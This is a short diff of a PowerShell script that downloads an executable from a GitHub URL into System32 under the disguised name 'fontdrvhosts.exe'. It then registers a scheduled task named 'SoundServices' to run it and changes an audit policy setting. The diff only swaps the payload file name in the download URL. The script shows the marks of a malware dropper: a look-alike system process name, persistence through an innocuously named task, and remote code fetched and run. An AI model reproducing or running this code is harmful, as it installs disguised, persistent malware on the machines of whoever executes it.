@@ -13,7 +13,7 @@ $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
 $databasePath = Join-Path $system32Path "database.txt"
  
  
-$exeUrl = "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/tsss.exe"
+$exeUrl = "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/td6u938.exe"
  
  
 Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
@@ -29,4 +29,5 @@ $cmd = 'cmd /c schtasks /create /tn "SoundServices" /tr "C:\Windows\System32\fon
 Invoke-Expression $cmd
  
  
+
 auditpol /set /subcategory:"Process Creation" /success:enable
